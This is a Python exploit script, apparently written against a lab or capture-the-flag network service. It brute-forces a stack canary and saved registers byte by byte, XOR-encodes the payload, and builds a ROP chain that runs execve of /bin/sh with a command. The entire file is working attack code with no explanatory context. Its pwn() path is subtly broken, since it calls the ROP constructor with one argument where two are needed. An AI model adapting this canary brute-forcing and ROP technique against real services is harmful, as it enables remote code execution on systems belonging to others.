import sys
import socket
import struct

_Host = '192.168.1.99'
_Port = 5555
_Correct_User=struct.pack("Q", 0x780d656469766164)

def reverse(_buffer):
	return _buffer[::-1]

def connect():	
	sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		sock.connect((_Host, _Port))
	except Exception as e:
		print("Error! Cannot connect: {0}", str(e))
		sys.exit(1)

	sock.settimeout(1)
	return sock

def test_payload(_buffer):
	mySock = connect()
	recv = mySock.recv(1024)
	mySock.send(_buffer)
	recv = mySock.recv(1024)
	mySock.close()
	print(recv.decode("utf-8"))

def xor_me(_buffer):
	_to_return = bytearray(len(_buffer))
	for index in range(0, len(_buffer)):
		_to_return[index] = _buffer[index] ^ 0x0d

	return _to_return

def brute_force(_Payload):
	byte_count=0
	dead=0
	count=0
	_to_return = bytearray()
	rec = ''

	while byte_count < 8:
		if count > 255:
			print("[!] ERROR!! count > 255\n")
			sys.exit(0)
		sock=connect()		
		rec=sock.recv(1024)
		_test_byte=struct.pack("B",int(hex(count),16))
		sock.send(_Payload + _to_return + _test_byte)
		try:
			rec=sock.recv(1024)
		except:
			if dead == 0:
				print("[!] Skipping dead bytes")		
			dead+=1
		if len(rec) > 0:
			byte_count += 1		
			_to_return += struct.pack("B",int(hex(count),16))
			count = 0
		else:
			count += 1

	return _to_return

class ROP():
	_pop_RAX_base	= 0x0000000000000b51
	_pop_RBP_base	= 0x0000000000000a90
	_pop_RDI_base	= 0x0000000000000f73
	_pop_RDX_base	= 0x0000000000000b53
	_pop_RSI_base	= 0x0000000000000f71	# pop rsi ; pop r15 ; ret
	_pop_RSP_base	= 0x0000000000000f6d	# pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
	_leave_ret_base	= 0x0000000000000b6d
	_syscall_base	= 0x0000000000000b55

	@staticmethod
	def prepare(largeInt):
		return xor_me(struct.pack("Q", largeInt))

	def __init__(self, ropOffset, stackOffset):
		self._pop_RAX = self.prepare(self._pop_RAX_base + ropOffset)
		self._pop_RBP = self.prepare(self._pop_RBP_base + ropOffset)
		self._pop_RDI = self.prepare(self._pop_RDI_base + ropOffset)
		self._pop_RDX = self.prepare(self._pop_RDX_base + ropOffset)
		self._pop_RSI = self.prepare(self._pop_RSI_base + ropOffset)
		self._pop_RSP = self.prepare(self._pop_RSP_base + ropOffset)
		self._leave_ret = self.prepare(self._leave_ret_base + ropOffset)
		self._syscall = self.prepare(self._syscall_base + ropOffset)

		self._execve_int = self.prepare(0x3b)
		self._JUNK = self.prepare(0xdeadbeefdeadbeef)
		self._NULL = self.prepare(0x0000000000000000)
		self._ARGS="-c"
		self._ARG2="/bin/ls"
		self._FILENAME="/bin/sh"
		self._FILENAME_address = self.prepare(stackOffset + 120)
		self._Ptr_To_ARGS_address = self.prepare(stackOffset + 96)
		self._Ptr_To_FILENAME_address = self.prepare(stackOffset + 88)
		self._ARGS_address = self.prepare(stackOffset + 121 + len(self._FILENAME))
		self._ARG2_address = self.prepare(stackOffset + 122 + len(self._FILENAME) + len(self._ARGS))
		self._NULL_address = self.prepare(stackOffset + 123 + len(self._FILENAME) + len(self._ARGS) + len(self._ARG2))

def find_canary(_Payload):
    _canary = brute_force(_Payload)
    test_payload(_Payload + _canary)
    _canary_hex = xor_me(reverse(_canary)).hex()
    print("[+] Canary found: {0}".format(_canary.hex()))
    
    return _canary

def find_RBP(_Payload):
    _RBP = brute_force(_Payload)
    _RBP_hex = xor_me(reverse(_RBP)).hex()
    print("[+] RBP found: {0}".format(_RBP_hex))
    return _RBP

def find_stack_offset(_RBP):
	_RBP_hex = xor_me(reverse(_RBP)).hex()	
	_stack_offset = int(_RBP_hex,16) - int("478",16)
	print("[*] stack offset: {0:x}".format(_stack_offset))
	return struct.pack("Q", int(hex(_stack_offset), 16))
	
def find_RSP(_Payload, _RBP):
    _RSP = brute_force(_Payload + _RBP)
    _RSP_hex = xor_me(reverse(_RSP)).hex()
    print("[+] RSP found: {0}".format(_RSP_hex))
    
    return _RSP

def find_rop_offset(_RSP):
    _RSP_hex = xor_me(reverse(_RSP)).hex()
    _rop_offset = int(_RSP_hex[0:13] + '000',16)
    print("[*] rop offset: {0:x}".format(_rop_offset))
    
    return _rop_offset

def string_to_payload(_STRING):
	_to_return = _STRING.encode("utf-8")
	_to_return = _to_return.replace(b' ', b'\x00')
	_to_return = xor_me(_to_return + b'\x00')
	return _to_return

def pwn():
	_Payload = _Correct_User + "A".encode("utf-8") * 1024
	_canary = find_canary(_Payload)
	_Payload += _canary
	
	## find RBP - used to calculate stack offset
	_RBP = find_RBP(_Payload)

	## find stack offset
	_stack_offset = find_stack_offset(_RBP)
	
	## find RSP - used to calculate ROP offset
	_RSP = find_RSP(_Payload, _RBP)
	
	## find ROP offset
	_rop_offset = find_rop_offset(_RSP)
	
	## make a ROP object and add to chain
	myRop = ROP(_rop_offset)
	_Payload += xor_me(_stack_offset)
	_Payload += myRop._leave_ret
	
	## fire!
	test_payload(_Payload)
	
def test():	
	_rop_offset = int('555555554000', 16)
	_stack_offset = int('7fffffffdcf8', 16)
	_Possible_sysem_value = _stack_offset - int('81CC728', 16)
	myRop = ROP(_rop_offset, _stack_offset)

	_Payload = _Correct_User + myRop._JUNK
	_Payload += myRop._pop_RAX
	_Payload += myRop._execve_int
	_Payload += myRop._pop_RSI
	_Payload += myRop._Ptr_To_ARGS_address + myRop._JUNK
	_Payload += myRop._pop_RDI
	_Payload += myRop._Ptr_To_FILENAME_address
	_Payload += myRop._pop_RDX
	_Payload += myRop._NULL
	_Payload += myRop._syscall
	_Payload += myRop._FILENAME_address
	_Payload += myRop._ARGS_address
	_Payload += myRop._ARG2_address
	_Payload += myRop._NULL_address
	_Payload += string_to_payload(myRop._FILENAME)
	_Payload += string_to_payload(myRop._ARGS)
	_Payload += string_to_payload(myRop._ARG2)
	_Payload += myRop._NULL
	_Payload += "A".encode("utf-8") * (1032 - len(_Payload))

	_canary = find_canary(_Payload)
	_Payload += _canary	
	_Payload += xor_me(struct.pack("Q", int(hex(_stack_offset), 16)))	
	_Payload += myRop._leave_ret
	
	## wait for it..
	print("[!] Time for debugger stuff\n[~] system? " + hex(_Possible_sysem_value))
	junk = input()

	## fire!
	test_payload(_Payload)

def main():
    #pwn()
    test()

    return 0

if __name__ == '__main__':
	sys.exit(main())
